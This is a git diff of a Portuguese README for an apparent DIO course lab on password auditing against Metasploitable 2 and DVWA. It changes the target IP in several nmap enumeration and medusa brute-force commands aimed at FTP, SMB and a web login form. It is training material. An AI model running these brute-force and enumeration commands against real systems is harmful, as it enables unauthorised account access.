@@ -21,7 +21,6 @@ Projeto prático do desafio da **DIO** sobre auditoria de senhas em ambiente con
 - [Cenário 3 — Password spraying em SMB](#-cenário-3--password-spraying-em-smb)
 - [Medidas de mitigação](#-medidas-de-mitigação)
 - [Reflexões e aprendizados](#-reflexões-e-aprendizados)
-- [Estrutura do repositório](#-estrutura-do-repositório)
 - [Referências](#-referências)
 
 ---
@@ -111,10 +110,11 @@ ifconfig
 
 ### 4. Teste de conectividade
 ```bash
-ping -c 4 192.168.56.20
+ping -c 4 192.168.1.114
 ```
+<img width="729" height="618" alt="01-configuracao-rede" src="https://github.com/user-attachments/assets/20028553-4d91-4a8f-a7d1-1b674817da38" />
 
-📸 *`/images/01-configuracao-rede.png`*
+📸 *`01-configuracao-rede.png`*
 
 ---
 
@@ -124,13 +124,13 @@ Antes de atacar, identifique os serviços e portas abertas do alvo:
 
 ```bash
 # Varredura de serviços e versões
-nmap -sV 192.168.56.20
+nmap -sV 192.168.1.114
 
 # Varredura completa com scripts padrão
-nmap -sC -sV -p- 192.168.56.20
+nmap -sC -sV -p- 192.168.1.114
 
 # Enumeração específica de SMB
-nmap -p 139,445 --script smb-os-discovery,smb-enum-shares,smb-enum-users 192.168.56.20
+nmap -p 139,445 --script smb-os-discovery,smb-enum-shares,smb-enum-users 192.168.1.114
 ```
 
 Isso confirma que FTP (21), SMB (139/445) e HTTP (80) estão ativos.
@@ -181,7 +181,7 @@ ls -lh /usr/share/wordlists/rockyou.txt
 O Metasploitable 2 roda o **vsftpd** na porta 21.
 
 ```bash
-medusa -h 192.168.56.20 \
+medusa -h 192.168.1.114 \
        -U wordlists/usuarios.txt \
        -P wordlists/senhas.txt \
        -M ftp \
@@ -214,12 +214,6 @@ ftp 192.168.56.20
 
 A DVWA (Damn Vulnerable Web Application) possui uma página de login ideal para testar ataques a formulários.
 
-### Preparação
-1. Acesse a DVWA pelo navegador: `http://192.168.56.20/dvwa`
-2. Faça login inicial (`admin` / `password`)
-3. Em **DVWA Security**, defina o nível como **Low** para o exercício
-4. Vá até o módulo **Brute Force**
-
 ### Captura dos parâmetros
 Use o **DevTools (F12) → aba Network** para inspecionar a requisição de login e identificar:
 - O método (GET/POST) e a URL
@@ -232,7 +226,7 @@ Use o **DevTools (F12) → aba Network** para inspecionar a requisição de logi
 # Consulte as opções exatas do módulo na sua versão:
 medusa -M web-form -q
 
-medusa -h 192.168.56.20 \
+medusa -h 192.168.1.114 \
        -u admin \
        -P wordlists/senhas.txt \
        -M web-form \
@@ -334,24 +328,6 @@ O objetivo real de um exercício como este é aprender a **defender**. Abaixo, a
 
 ---
 
-## 📂 Estrutura do repositório
-
-```
-.
-├── README.md
-├── Wordlists/
-│   ├── usuarios.txt
-│   ├── senhas.txt
-│   └── usuarios_smb.txt
-└── Imagens/
-    ├── 01-configuracao-rede.png
-    ├── 02-nmap-scan.png
-    ├── 03-medusa-ftp.png
-    ├── 04-dvwa-bruteforce.png
-    └── 05-smb-spraying.png
-```
-
----
 
 ## 📚 Referências
 
